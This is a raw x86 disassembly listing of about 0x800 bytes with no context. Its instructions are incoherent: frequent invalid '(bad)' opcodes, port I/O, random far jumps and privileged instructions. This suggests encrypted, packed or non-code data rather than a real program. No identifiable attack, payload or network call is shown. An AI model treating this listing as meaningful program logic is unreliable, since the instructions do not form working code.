  409a7d:	dec    ecx
  409a7e:	push   cs
  409a7f:	pop    eax
  409a80:	popa   
  409a81:	fsub   QWORD PTR [ebx]
  409a83:	imul   ah
  409a85:	scas   eax,DWORD PTR es:[edi]
  409a86:	cmp    al,0x48
  409a88:	gs xchg edi,eax
  409a8a:	jno    0x409a92
  409a8c:	mov    ah,BYTE PTR [edi]
  409a8e:	fisub  WORD PTR [ecx+0x66bf511f]
  409a94:	push   cs
  409a95:	jmp    0x1252:0x63afb2ce
  409a9c:	mov    bh,0xb4
  409a9e:	mov    esi,0x1ab2fb25
  409aa3:	adc    edx,DWORD PTR [eax+0x4d]
  409aa6:	cmp    BYTE PTR [ecx+0x172ba91d],dh
  409aac:	fisttp WORD PTR [ebp-0x72bfaa5a]
  409ab2:	(bad)  
  409ab3:	lds    esi,FWORD PTR [ebx+0x34]
  409ab6:	sub    eax,0xdb039527
  409abb:	push   0xed222f74
  409ac0:	jmp    DWORD PTR [esi+ecx*4-0x4a]
  409ac4:	and    al,0x55
  409ac6:	fwait
  409ac7:	push   es
  409ac8:	in     al,dx
  409ac9:	test   ebx,esi
  409acb:	adc    BYTE PTR [ebx+0x1987300e],ah
  409ad1:	pop    ss
  409ad2:	mov    ch,BYTE PTR [ebp+0x69]
  409ad5:	mov    ebp,0x2509c7f
  409ada:	cld    
  409adb:	loopne 0x409b0d
  409add:	fidivr WORD PTR [edx+0x765dc4e8]
  409ae3:	test   DWORD PTR [ebp+0x14],edx
  409ae6:	jmp    0x673a:0x2a433f9c
  409aed:	jg     0x409ae8
  409aef:	out    dx,eax
  409af0:	lea    esp,[edx+ebx*2-0x50cdf182]
  409af7:	push   ds
  409af8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409af9:	and    al,0x9e
  409afb:	adc    ch,BYTE PTR [esi+eax*2]
  409afe:	or     al,0xf
  409b00:	xchg   ecx,eax
  409b01:	ret    0x2edf
  409b04:	ss dec ecx
  409b06:	jl     0x409b77
  409b08:	das    
  409b09:	cld    
  409b0a:	test   eax,0xe87e35b5
  409b0f:	push   0x12
  409b11:	lds    edx,FWORD PTR [ebx*8+0x4042b4df]
  409b18:	xor    eax,0x61970b99
  409b1d:	stc    
  409b1e:	pop    ds
  409b1f:	icebp  
  409b20:	int    0xc5
  409b22:	rcr    cl,1
  409b24:	mov    bh,0xb9
  409b26:	cmp    BYTE PTR [edx+0x55ea7e99],dh
  409b2c:	mov    dh,0xdf
  409b2e:	or     eax,0xd1c60f97
  409b33:	sti    
  409b34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b35:	outs   dx,DWORD PTR ds:[esi]
  409b36:	int    0x3f
  409b38:	iret   
  409b39:	popa   
  409b3a:	dec    ebp
  409b3b:	mov    DWORD PTR [ebx-0xb5b6dc2],edi
  409b41:	(bad)  
  409b42:	cld    
  409b43:	cs adc al,0x7d
  409b46:	add    DWORD PTR [ebp+0x64],ebx
  409b49:	xchg   ebp,eax
  409b4a:	neg    BYTE PTR [ebp-0x67425348]
  409b50:	mov    al,ds:0x56c3be9b
  409b55:	je     0x409b5e
  409b57:	call   0x7912:0x2b999b58
  409b5e:	xchg   BYTE PTR [esi-0x11],dl
  409b61:	es sub ebp,DWORD PTR ds:[esi]
  409b65:	jne    0x409b63
  409b67:	sbb    BYTE PTR [edi-0x27],cl
  409b6a:	out    0xd3,al
  409b6c:	stos   DWORD PTR es:[edi],eax
  409b6d:	aaa    
  409b6e:	mov    ch,0x53
  409b70:	stos   BYTE PTR es:[edi],al
  409b71:	push   0x54ac39d9
  409b76:	push   ecx
  409b77:	jmp    0xbbf9:0x950182bd
  409b7e:	daa    
  409b7f:	and    dh,BYTE PTR [ebx+0x69c68f9]
  409b85:	ret    0xf3ed
  409b88:	pushf  
  409b89:	mov    ebp,ebx
  409b8b:	sub    ch,BYTE PTR [edx]
  409b8d:	into   
  409b8e:	dec    edx
  409b8f:	xor    ch,dl
  409b91:	xor    ebx,DWORD PTR [ebp+0x35554f59]
  409b97:	mov    al,0x56
  409b99:	xchg   edx,eax
  409b9a:	in     al,dx
  409b9b:	dec    esp
  409b9c:	push   esi
  409b9d:	pop    esi
  409b9e:	jmp    FWORD PTR cs:[edi]
  409ba1:	rcr    BYTE PTR es:[di],0x32
  409ba6:	ins    BYTE PTR es:[edi],dx
  409ba7:	daa    
  409ba8:	dec    ecx
  409ba9:	and    dl,BYTE PTR [edi-0x62]
  409bac:	and    bl,BYTE PTR [esi+0x3b]
  409baf:	in     eax,dx
  409bb0:	fiadd  WORD PTR [edx-0x28c4e65d]
  409bb6:	clc    
  409bb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bb8:	in     eax,0x5f
  409bba:	xor    edi,DWORD PTR [ebp-0x6d]
  409bbd:	mov    edi,0x4a93cc1b
  409bc2:	cld    
  409bc3:	ins    DWORD PTR es:[edi],dx
  409bc4:	push   ecx
  409bc5:	push   0x56b079ac
  409bca:	test   al,0x2
  409bcc:	mov    ebx,0x4c8db00f
  409bd1:	bound  ebx,QWORD PTR [eax]
  409bd3:	mov    ch,0x3a
  409bd5:	jne    0x409b7a
  409bd7:	jno    0x409b9e
  409bd9:	xor    al,BYTE PTR [eax]
  409bdb:	xchg   ecx,eax
  409bdc:	or     esi,DWORD PTR [esi]
  409bde:	jo     0x409b7d
  409be0:	int3   
  409be1:	cmp    DWORD PTR [eax+0x88e1c91],edi
  409be7:	cmp    DWORD PTR [ebp+0x2c],ebp
  409bea:	mov    ebx,0x445e9a8f
  409bef:	outs   dx,BYTE PTR ds:[esi]
  409bf0:	push   edi
  409bf1:	xor    bh,BYTE PTR [ebx]
  409bf3:	mov    ch,0xa2
  409bf5:	add    edx,ebx
  409bf7:	js     0x409bbf
  409bf9:	sti    
  409bfa:	pop    esp
  409bfb:	dec    edi
  409bfc:	xchg   edi,eax
  409bfd:	aam    0xaa
  409bff:	sub    ah,BYTE PTR [eax-0xe3be3ab]
  409c05:	into   
  409c06:	lds    esp,FWORD PTR [esi+0x1a]
  409c09:	push   0xd03f059e
  409c0e:	xchg   edi,eax
  409c0f:	mov    ecx,0x6051f1bc
  409c14:	cmc    
  409c15:	ds je  0x409bf9
  409c18:	in     eax,0xbd
  409c1a:	nop
  409c1b:	lock aad 0xc4
  409c1e:	shr    DWORD PTR [ecx],cl
  409c20:	ins    DWORD PTR es:[edi],dx
  409c21:	or     eax,DWORD PTR [edi+0x5a007e61]
  409c27:	sahf   
  409c28:	mov    ebp,0x50f6c4bd
  409c2d:	cld    
  409c2e:	lock cdq 
  409c30:	adc    edx,DWORD PTR [edx-0xd6f427d]
  409c36:	cmp    ch,BYTE PTR [ecx]
  409c38:	loop   0x409c13
  409c3a:	cs dec edx
  409c3c:	jmp    0xd08d7a29
  409c41:	in     eax,dx
  409c42:	sub    al,0x8e
  409c44:	mov    al,0x3b
  409c46:	xor    DWORD PTR [eax-0x6ae9125a],0xffffffc6
  409c4d:	cmp    dl,BYTE PTR [ebp+0x44]
  409c50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c51:	popa   
  409c52:	lock push edx
  409c54:	(bad)  
  409c55:	sbb    al,0xf7
  409c57:	cli    
  409c58:	in     eax,0x57
  409c5a:	xchg   ecx,eax
  409c5b:	rcl    edx,0x12
  409c5e:	cmp    edi,DWORD PTR [esi+ebp*8+0x1f]
  409c62:	mov    eax,ds:0x1398237a
  409c67:	cmp    ah,ah
  409c69:	shr    ch,cl
  409c6b:	sub    eax,0x43eb7e92
  409c70:	bound  esi,QWORD PTR [edi-0x56]
  409c73:	les    edx,FWORD PTR [edx]
  409c75:	rol    DWORD PTR [eax],cl
  409c77:	mov    ah,0x7
  409c79:	ret    0xc414
  409c7c:	push   ebp
  409c7d:	push   ecx
  409c7e:	out    dx,al
  409c7f:	and    al,0x42
  409c81:	dec    edi
  409c82:	mov    edi,0x54d4db29
  409c87:	loopne 0x409ccd
  409c89:	and    DWORD PTR [esi+0x25],edx
  409c8c:	inc    eax
  409c8d:	mov    ds:0x62c28514,al
  409c92:	shl    edi,0x44
  409c95:	xchg   esp,eax
  409c96:	pop    edi
  409c97:	or     eax,0x14ad39d6
  409c9c:	sbb    BYTE PTR [ecx],bh
  409c9e:	push   ds
  409c9f:	mov    dh,0x45
  409ca1:	(bad)  
  409ca2:	out    dx,al
  409ca3:	out    0x75,al
  409ca5:	jno    0x409c9a
  409ca7:	inc    ebp
  409ca8:	das    
  409ca9:	adc    ecx,DWORD PTR [edx+esi*1]
  409cac:	xchg   DWORD PTR [ecx+0x36],esp
  409caf:	xchg   esp,eax
  409cb0:	repz dec ebp
  409cb2:	in     eax,dx
  409cb3:	jg     0x409cb9
  409cb5:	cs iret 
  409cb7:	jne    0x409c63
  409cb9:	xchg   BYTE PTR [ecx+esi*8],dh
  409cbc:	call   0x3fce:0xb32552a9
  409cc3:	jmp    0x6ebb:0x93e1a6a9
  409cca:	fsub   QWORD PTR [edx+0x0]
  409ccd:	inc    ebx
  409cce:	loop   0x409cf1
  409cd0:	xlat   BYTE PTR ds:[ebx]
  409cd1:	sbb    BYTE PTR [edi],dh
  409cd3:	pop    eax
  409cd4:	cmp    DWORD PTR [ecx-0x37],esp
  409cd7:	test   DWORD PTR [ebp+0x63],esp
  409cda:	mov    ds:0x43f1ce8c,eax
  409cdf:	mov    ah,0x35
  409ce1:	pop    esi
  409ce2:	leave  
  409ce3:	sti    
  409ce4:	pop    ecx
  409ce5:	fsubr  st(7),st
  409ce7:	in     eax,dx
  409ce8:	dec    esi
  409ce9:	push   cs
  409cea:	cmp    bl,BYTE PTR [ebp-0x6ecb35e9]
  409cf0:	stos   DWORD PTR es:[edi],eax
  409cf1:	push   ebp
  409cf2:	pop    esi
  409cf3:	push   ss
  409cf4:	xor    al,0xc1
  409cf6:	data16 je 0x409d40
  409cf9:	and    dh,ah
  409cfb:	push   esp
  409cfc:	adc    al,0xfd
  409cfe:	imul   ecx
  409d00:	jg     0x409c86
  409d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d03:	mov    ebx,0xd85e1ebc
  409d08:	mov    cl,0x2e
  409d0a:	retf   0xacd4
  409d0d:	ins    BYTE PTR es:[edi],dx
  409d0e:	jno    0x409d36
  409d10:	sub    al,0x6f
  409d12:	div    DWORD PTR [edi+0x4800d0f9]
  409d18:	daa    
  409d19:	add    al,0xd2
  409d1b:	(bad)  
  409d1c:	jnp    0x409d4b
  409d1e:	push   esi
  409d1f:	sbb    BYTE PTR [esi+ebx*1-0xe],ch
  409d23:	stos   BYTE PTR es:[edi],al
  409d24:	icebp  
  409d25:	push   esi
  409d27:	push   ds
  409d28:	adc    eax,DWORD PTR [ebp+0x78]
  409d2b:	mov    ds:0x97fa5f44,eax
  409d30:	pop    ds
  409d31:	add    DWORD PTR [esi+0x2a35af50],ebp
  409d37:	jmp    0x8515ebe8
  409d3c:	aad    0x79
  409d3e:	retf   
  409d3f:	loop   0x409d9c
  409d41:	xchg   ebp,eax
  409d42:	and    ecx,DWORD PTR [edi+0x7aacad5a]
  409d48:	push   eax
  409d49:	or     BYTE PTR [eax+0x1c2e47ba],ah
  409d4f:	fxch   st(7)
  409d51:	sub    eax,0x540eb962
  409d56:	bound  edi,QWORD PTR [esi-0x68f00b18]
  409d5c:	and    bl,BYTE PTR [ebx+0x4c]
  409d5f:	push   ss
  409d60:	sub    bl,bl
  409d62:	pop    ecx
  409d63:	or     eax,0x9c452277
  409d68:	loope  0x409d3e
  409d6a:	xchg   ebx,eax
  409d6b:	test   BYTE PTR [ebp-0x25],dh
  409d6e:	pop    ecx
  409d6f:	jp     0x409da7
  409d71:	jmp    0x409d10
  409d73:	fnstenv [ecx-0x26]
  409d76:	aas    
  409d77:	mov    ds:0x71dbcf60,al
  409d7c:	cmp    BYTE PTR [edi-0x1f],ch
  409d7f:	or     esp,DWORD PTR [ecx+ecx*1]
  409d82:	xchg   ebp,eax
  409d83:	mov    bh,0x79
  409d85:	jl     0x409d3c
  409d87:	sahf   
  409d88:	lods   al,BYTE PTR ds:[esi]
  409d89:	lods   eax,DWORD PTR ds:[esi]
  409d8a:	sbb    DWORD PTR [edi+0x15cf37dd],ebx
  409d90:	xor    edx,DWORD PTR [eax]
  409d92:	aam    0x76
  409d94:	outs   dx,DWORD PTR ds:[esi]
  409d95:	test   DWORD PTR [ebx-0x11],0x56a45ba4
  409d9c:	xor    BYTE PTR [ebx+ebp*1-0x6967753e],dh
  409da3:	or     DWORD PTR [eax-0x3c47ea0],edi
  409da9:	add    edi,DWORD PTR [esi-0x4b]
  409dac:	shl    BYTE PTR [edx],cl
  409dae:	push   ecx
  409daf:	je     0x409d72
  409db1:	mov    edx,ebx
  409db3:	adc    cl,BYTE PTR [edx-0x121895cd]
  409db9:	in     eax,dx
  409dba:	xchg   ebx,eax
  409dbb:	fdiv   QWORD PTR [ebx-0x6b874aaa]
  409dc1:	adc    eax,0x5aed8731
  409dc6:	shr    DWORD PTR [eax],1
  409dc8:	sbb    ebp,edi
  409dca:	inc    ebx
  409dcb:	lock adc bh,0x97
  409dcf:	shl    dh,0x5f
  409dd2:	mov    edx,0x3c5bbf71
  409dd7:	xchg   DWORD PTR [ecx+eiz*4-0x4b],ecx
  409ddb:	jle    0x409e18
  409ddd:	mov    eax,esp
  409ddf:	stc    
  409de0:	lods   al,BYTE PTR ds:[esi]
  409de1:	add    DWORD PTR es:[edx],eax
  409de4:	push   esp
  409de5:	xor    al,0xba
  409de7:	jnp    0x409da8
  409de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dea:	mov    dh,0x27
  409dec:	icebp  
  409ded:	cmp    esp,DWORD PTR [ebx+0x1102372d]
  409df3:	dec    edx
  409df4:	(bad)  
  409df5:	leave  
  409df6:	cmp    dl,BYTE PTR [edx+0x69]
  409df9:	popf   
  409dfa:	mov    bh,0xd
  409dfc:	mov    ch,0x10
  409dfe:	jmp    0x87410210
  409e03:	mov    eax,0xa1bb498c
  409e08:	inc    edi
  409e09:	shl    BYTE PTR [edi-0x4a9d3c25],0x56
  409e10:	mov    dl,0x3
  409e12:	aad    0xe7
  409e14:	push   0xcb6da4bd
  409e19:	jecxz  0x409e80
  409e1b:	mov    cl,0xca
  409e1d:	mov    edx,0xbf71b9c0
  409e22:	mov    esp,DWORD PTR [ebx]
  409e24:	imul   edi,DWORD PTR [eax-0x7a],0x10
  409e28:	push   ds
  409e29:	push   esp
  409e2a:	hlt    
  409e2b:	pop    ebp
  409e2c:	scas   al,BYTE PTR es:[edi]
  409e2d:	xor    al,0x80
  409e2f:	jne    0x409de2
  409e31:	and    ch,BYTE PTR [ebx+0x21]
  409e34:	(bad)  
  409e37:	cmp    dl,0xb3
  409e3a:	cmp    DWORD PTR [eax-0x3040f540],0x9919412b
  409e44:	push   0xd39fd626
  409e49:	jmp    0x41bf:0xe9779416
  409e50:	das    
  409e51:	call   0xcab700e
  409e56:	mov    dl,BYTE PTR [eax]
  409e58:	rcr    DWORD PTR [ebp-0x2e],cl
  409e5b:	call   0xd89d9a8a
  409e60:	int3   
  409e61:	or     BYTE PTR [eax+0x5126e299],0x1b
  409e68:	jns    0x409e08
  409e6a:	bound  ebx,QWORD PTR [edx+0x6d78582f]
  409e70:	addr16 je 0x409ed6
  409e73:	push   edx
  409e74:	jge    0x409eb8
  409e76:	repz int 0x54
  409e79:	jmp    0x58f1:0xe4467cf8
  409e80:	bound  esi,QWORD PTR [edx+0x22]
  409e83:	jle    0x409ea1
  409e85:	xchg   ebp,eax
  409e86:	test   al,0xd4
  409e88:	adc    dl,BYTE PTR [edi]
  409e8a:	out    0x66,al
  409e8c:	pop    ebx
  409e8d:	dec    edx
  409e8e:	cld    
  409e8f:	jle    0x409e1e
  409e91:	aas    
  409e92:	int3   
  409e93:	inc    ecx
  409e94:	sub    eax,0xb41f9c59
  409e99:	out    0x8e,al
  409e9b:	int3   
  409e9c:	outs   dx,DWORD PTR ds:[esi]
  409e9d:	stos   BYTE PTR es:[edi],al
  409e9e:	jmp    0xac22:0x6f8ed70b
  409ea5:	mov    ah,0x98
  409ea7:	pop    ds
  409ea8:	idiv   DWORD PTR [eax-0x646d90df]
  409eae:	xchg   edi,eax
  409eaf:	out    0x12,al
  409eb1:	jge    0x409ea4
  409eb3:	push   ebp
  409eb4:	getsec 
  409eb6:	and    BYTE PTR [eax+0x62a04df5],dl
  409ebc:	addr16 test bh,ch
  409ebf:	popf   
  409ec0:	pop    esp
  409ec1:	mov    ds:0x42ff11c,eax
  409ec6:	dec    edx
  409ec7:	pop    ebx
  409ec8:	out    0x18,eax
  409eca:	dec    esp
  409ecb:	or     BYTE PTR [esi-0x2],dh
  409ece:	pop    ebp
  409ecf:	sbb    eax,0xb4a0728f
  409ed4:	add    al,0x84
  409ed6:	push   cs
  409ed7:	mov    ds:0x36fd6c18,eax
  409edc:	push   ebp
  409edd:	or     edi,0x77cac3db
  409ee3:	xchg   ecx,eax
  409ee4:	push   0xffffffdd
  409ee6:	or     DWORD PTR [esp+ebp*1-0x62],esi
  409eea:	shr    ebp,0x44
  409eed:	mov    eax,0xa4c1078d
  409ef2:	dec    esp
  409ef3:	dec    eax
  409ef4:	jbe    0x409f1c
  409ef6:	leave  
  409ef7:	mov    eax,0xb6ab0f70
  409efc:	xor    BYTE PTR [ebx+0x6e],0xbf
  409f00:	jmp    0x21:0x694411fa
  409f07:	ret    
  409f08:	mov    bl,0x79
  409f0a:	push   ecx
  409f0b:	jmp    0xc8781b9a
  409f10:	jp     0x409f8e
  409f12:	inc    edx
  409f13:	in     al,dx
  409f14:	fxch   st(4)
  409f16:	icebp  
  409f17:	test   esp,ebx
  409f19:	lods   al,BYTE PTR ds:[esi]
  409f1a:	dec    ebp
  409f1b:	push   0xfc164d55
  409f20:	(bad)  
  409f21:	in     eax,0xf6
  409f23:	sahf   
  409f24:	push   ebx
  409f25:	sub    DWORD PTR [ebp+0x1d],esp
  409f28:	add    al,0xe
  409f2a:	out    dx,al
  409f2b:	jle    0x409f6c
  409f2d:	xchg   al,ch
  409f2f:	adc    edx,eax
  409f31:	jle    0x409eb8
  409f33:	add    al,0x83
  409f35:	mov    ebx,DWORD PTR [edi+0x36]
  409f38:	cmpxchg DWORD PTR [edi+0x2d],edx
  409f3c:	sub    eax,esp
  409f3e:	loope  0x409ef0
  409f40:	inc    edi
  409f41:	push   esp
  409f42:	lock pop ss
  409f44:	and    eax,0x7bde0cc2
  409f49:	and    eax,DWORD PTR [esp+eiz*8+0x19]
  409f4d:	outs   dx,BYTE PTR ds:[esi]
  409f4e:	mov    esp,0xd4afde19
  409f53:	sti    
  409f54:	sub    eax,0x12efd4c9
  409f59:	add    al,0xfe
  409f5b:	call   0x92e9:0xb1300fe9
  409f62:	or     DWORD PTR [eax+0x4c],eax
  409f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f66:	inc    edi
  409f67:	pop    esi
  409f68:	cmp    edx,DWORD PTR [edx-0x48]
  409f6b:	inc    ebp
  409f6c:	pop    eax
  409f6d:	sahf   
  409f6e:	lds    edi,FWORD PTR ss:[ecx+eax*8-0x1f]
  409f73:	sbb    ebx,DWORD PTR [edx+0x2030d4c8]
  409f79:	mov    eax,ds:0xc009f56f
  409f7e:	jnp    0x409fbc
  409f80:	dec    edx
  409f81:	in     al,0x37
  409f83:	(bad)  
  409f84:	in     eax,0xa7
  409f86:	scas   al,BYTE PTR es:[edi]
  409f87:	cld    
  409f88:	stc    
  409f89:	(bad)  
  409f8a:	sbb    ah,bl
  409f8c:	test   BYTE PTR [eax],0x96
  409f8f:	mov    esp,0xef5ce1b9
  409f94:	stc    
  409f95:	out    dx,al
  409f96:	ds dec eax
  409f98:	pop    ds
  409f99:	cmp    bl,bl
  409f9b:	add    dh,BYTE PTR [ebx+0x15]
  409f9e:	mov    esp,0x517ab3b9
  409fa3:	add    DWORD PTR [edx+ecx*2],0x2c
  409fa7:	mov    ch,0x65
  409fa9:	or     BYTE PTR [ebp+0x5c2c033c],cl
  409faf:	data16 int3 
  409fb1:	xor    al,0x56
  409fb3:	jge    0x40a02e
  409fb5:	outs   dx,BYTE PTR ds:[esi]
  409fb6:	xchg   esi,eax
  409fb7:	cmp    eax,0x6dcecf25
  409fbc:	test   BYTE PTR [ecx-0x46254345],dl
  409fc2:	mov    ecx,0x6120911f
  409fc7:	nop
  409fc8:	shr    ecx,1
  409fca:	icebp  
  409fcb:	bound  ebp,QWORD PTR [eax-0x13774cce]
  409fd1:	(bad)  
  409fd2:	pop    edx
  409fd3:	popa   
  409fd4:	pop    ecx
  409fd5:	jge    0x409f7b
  409fd7:	scas   eax,DWORD PTR es:[edi]
  409fd8:	lods   al,BYTE PTR ds:[esi]
  409fd9:	add    al,BYTE PTR [edx+0x467b8c9c]
  409fdf:	xchg   ebx,eax
  409fe0:	mov    ecx,0x4c074449
  409fe5:	aas    
  409fe6:	add    edx,DWORD PTR [eax+edi*4]
  409fe9:	xchg   esi,eax
  409fea:	retfw  
  409fec:	jl     0x40a043
  409fee:	push   es
  409fef:	fst    QWORD PTR [esi-0x76db8f86]
  409ff5:	xchg   esp,eax
  409ff6:	lds    ecx,FWORD PTR [edx-0x4]
  409ff9:	imul   edi,DWORD PTR [edi],0xffffffb6
  409ffc:	sar    BYTE PTR [esi+0x4e],1
  409fff:	push   es
  40a000:	mov    ch,0x66
  40a002:	aam    0xe8
  40a004:	dec    esp
  40a005:	inc    ecx
  40a006:	lods   al,BYTE PTR ds:[esi]
  40a007:	aaa    
  40a008:	std    
  40a009:	inc    ebx
  40a00a:	popf   
  40a00b:	jne    0x409ff3
  40a00d:	sahf   
  40a00e:	sub    dh,BYTE PTR [ebx+0x4153644a]
  40a014:	call   0x58e7:0x284b1474
  40a01b:	mov    cl,BYTE PTR [esi+ebx*4]
  40a01e:	mov    ds:0x840632f5,eax
  40a023:	fstp   TBYTE PTR [eax-0x73e14550]
  40a029:	sbb    ebx,DWORD PTR [ecx]
  40a02b:	push   ebp
  40a02c:	mov    BYTE PTR [edi],0xee
  40a02f:	lahf   
  40a030:	jbe    0x40a081
  40a032:	inc    edi
  40a033:	retf   0x8540
  40a036:	cmp    cl,al
  40a038:	mov    dl,0xc8
  40a03a:	adc    bl,BYTE PTR [edi+0x29638ea0]
  40a040:	sahf   
  40a041:	sti    
  40a042:	jle    0x40a07d
  40a044:	inc    ecx
  40a045:	sti    
  40a046:	les    ebp,FWORD PTR [edx+0x43]
  40a049:	in     al,dx
  40a04a:	jns    0x40a014
  40a04c:	cli    
  40a04d:	and    esi,ebx
  40a04f:	push   es
  40a050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a051:	xlat   BYTE PTR ds:[ebx]
  40a052:	sub    eax,0x382331a4
  40a057:	jae    0x40a036
  40a059:	jns    0x40a047
  40a05b:	stos   DWORD PTR es:[edi],eax
  40a05c:	jne    0x40a000
  40a05e:	jns    0x40a013
  40a060:	xlat   BYTE PTR ds:[ebx]
  40a061:	hlt    
  40a062:	and    BYTE PTR [eax-0x35750770],ah
  40a068:	dec    ebx
  40a069:	daa    
  40a06a:	aad    0x9e
  40a06c:	inc    edx
  40a06d:	sahf   
  40a06e:	or     BYTE PTR [eax+0x1],dh
  40a071:	sbb    BYTE PTR [edi-0x7b10b1e8],ah
  40a077:	lock (bad) [esi]
  40a07a:	mov    cl,BYTE PTR [esi+edx*8+0x7a979d05]
  40a081:	xor    eax,edi
  40a083:	mov    WORD PTR [edx+0x64],cs
  40a086:	cdq    
  40a087:	stc    
  40a088:	sbb    DWORD PTR [ebx+ecx*1-0x42459847],ebx
  40a08f:	dec    ecx
  40a091:	cmp    ecx,DWORD PTR [eax+0x9]
  40a094:	or     cl,0xd5
  40a097:	pop    edx
  40a098:	pushf  
  40a099:	sti    
  40a09a:	or     ah,BYTE PTR [esi+ebp*1]
  40a09d:	loope  0x40a0ac
  40a09f:	ret    
  40a0a0:	xchg   BYTE PTR [edx+eax*2+0x22d4421d],bh
  40a0a7:	lock and eax,0x6a851c8b
  40a0ad:	adc    dl,BYTE PTR [ebx]
  40a0af:	xchg   esp,eax
  40a0b0:	pop    es
  40a0b1:	adc    edx,edx
  40a0b3:	mov    ecx,0xbe953dc7
  40a0b8:	pop    eax
  40a0b9:	sbb    al,0xee
  40a0bb:	mov    edx,DWORD PTR [ebp-0x6bcba6e6]
  40a0c1:	mov    ah,0xb9
  40a0c3:	add    eax,0x5d952d76
  40a0c8:	and    ebx,esp
  40a0ca:	retf   0x511f
  40a0cd:	sbb    ebp,DWORD PTR [ecx+eax*8-0x51]
  40a0d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0d2:	jmp    0x40a151
  40a0d4:	cs jae 0x40a147
  40a0d7:	pop    es
  40a0d8:	sbb    bh,BYTE PTR [edx+ebp*4]
  40a0db:	out    0x7b,al
  40a0dd:	xor    eax,0x7505327a
  40a0e2:	jns    0x40a15a
  40a0e4:	cmp    al,0x94
  40a0e6:	repz xchg edi,eax
  40a0e8:	(bad)  
  40a0e9:	hlt    
  40a0ea:	std    
  40a0eb:	or     DWORD PTR [ecx+0x4d],ebx
  40a0ee:	mov    edi,ss
  40a0f0:	xchg   edi,eax
  40a0f1:	dec    esi
  40a0f2:	mov    ecx,0x28a58d16
  40a0f7:	imul   ecx,edi,0xf395fac2
  40a0fd:	adc    ebx,0xffffff83
  40a100:	retf   
  40a101:	popa   
  40a102:	inc    edx
  40a103:	sar    BYTE PTR [ebx+0x37],1
  40a106:	bnd jge 0x40a0ce
  40a109:	adc    eax,0xbebcb333
  40a10e:	jbe    0x40a138
  40a110:	ins    BYTE PTR es:[edi],dx
  40a111:	retf   0x5a78
  40a114:	mov    ebp,0xabc1e3b
  40a119:	repz into 
  40a11b:	dec    ebx
  40a11c:	xor    esi,DWORD PTR [edi-0x2b969bdf]
  40a122:	mov    dh,0x9e
  40a124:	inc    edi
  40a125:	ret    
  40a126:	sbb    cl,dl
  40a128:	fist   DWORD PTR [edx-0x614ecb0]
  40a12e:	and    al,0x34
  40a130:	pop    edx
  40a131:	(bad)  
  40a132:	out    dx,al
  40a133:	dec    esp
  40a134:	ins    DWORD PTR es:[edi],dx
  40a135:	and    al,0x8b
  40a137:	push   ss
  40a138:	aaa    
  40a139:	push   eax
  40a13a:	loop   0x40a14c
  40a13c:	hlt    
  40a13d:	mov    eax,0xb12e4393
  40a142:	rcl    BYTE PTR ds:0xbf9a4819,cl
  40a148:	or     ebx,0x29
  40a14b:	aam    0x6a
  40a14d:	das    
  40a14e:	pop    esi
  40a14f:	dec    edi
  40a150:	ror    BYTE PTR [edi+0x77f5168d],1
  40a156:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a157:	push   edx
  40a158:	adc    al,BYTE PTR [edx-0x611f78d]
  40a15e:	mov    ds:0x6d226b75,al
  40a163:	mov    ds:0x5c1f7aa7,eax
  40a168:	sar    BYTE PTR [edi],cl
  40a16a:	rcl    ecx,0xd5
  40a16d:	ins    BYTE PTR es:[edi],dx
  40a16e:	and    eax,0x4eea695e
  40a173:	icebp  
  40a174:	push   es
  40a175:	mov    dh,0xce
  40a177:	popf   
  40a178:	clc    
  40a179:	mov    ebx,DWORD PTR [edx-0x40]
  40a17c:	sar    BYTE PTR [eax],0x6
  40a17f:	pop    esi
  40a180:	or     BYTE PTR [ecx+0x45164d5d],al
  40a186:	ins    DWORD PTR es:[edi],dx
  40a187:	rcl    DWORD PTR [eax],1
  40a189:	test   DWORD PTR [edx],ebp
  40a18b:	and    ah,BYTE PTR [esi]
  40a18d:	(bad)  
  40a18e:	mov    DWORD PTR [eax],eax
  40a190:	xchg   esi,eax
  40a191:	loop   0x40a145
  40a193:	ins    BYTE PTR es:[edi],dx
  40a194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a195:	(bad)  
  40a196:	pop    ss
  40a197:	push   edx
  40a198:	test   DWORD PTR [ebx+0x4257ba70],esi
  40a19e:	lea    edi,[edx]
  40a1a0:	dec    esi
  40a1a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1a2:	jmp    0xbe5ea293
  40a1a7:	bound  edi,QWORD PTR [esi-0x282451ec]
  40a1ad:	push   ebp
  40a1ae:	imul   edx,DWORD PTR [esi-0xf],0xe5d5b9e2
  40a1b5:	scas   al,BYTE PTR es:[edi]
  40a1b6:	mov    DWORD PTR [ebx-0x354f0e3b],esi
  40a1bc:	cwde   
  40a1bd:	push   esi
  40a1be:	add    eax,0xa98147d3
  40a1c3:	xchg   esi,eax
  40a1c4:	mov    eax,0x427487f8
  40a1c9:	mov    dh,0xb3
  40a1cb:	xlat   BYTE PTR ds:[ebx]
  40a1cc:	out    0xb1,eax
  40a1ce:	cld    
  40a1cf:	mov    edi,0x88b53fba
  40a1d4:	call   0xa2845b87
  40a1d9:	(bad)  
  40a1da:	out    dx,al
  40a1db:	ret    
  40a1dc:	(bad)  
  40a1dd:	sub    DWORD PTR [edi+0x79],edx
  40a1e0:	jecxz  0x40a20f
  40a1e2:	cmp    al,0xa9
  40a1e4:	jno    0x40a227
  40a1e6:	loop   0x40a213
  40a1e8:	les    ebx,FWORD PTR [edi]
  40a1ea:	sub    ah,BYTE PTR [esp+esi*2+0x13]
  40a1ee:	ja     0x40a205
  40a1f0:	in     al,0x5
  40a1f2:	or     BYTE PTR [esi],dh
  40a1f4:	(bad)  
  40a1f5:	les    esi,FWORD PTR [ebx+ebx*2+0x6c]
  40a1f9:	and    ch,BYTE PTR [edx]
  40a1fb:	cmp    eax,0x7cbfc7ee
  40a200:	scas   al,BYTE PTR es:[edi]
  40a201:	xchg   edi,eax
  40a202:	cli    
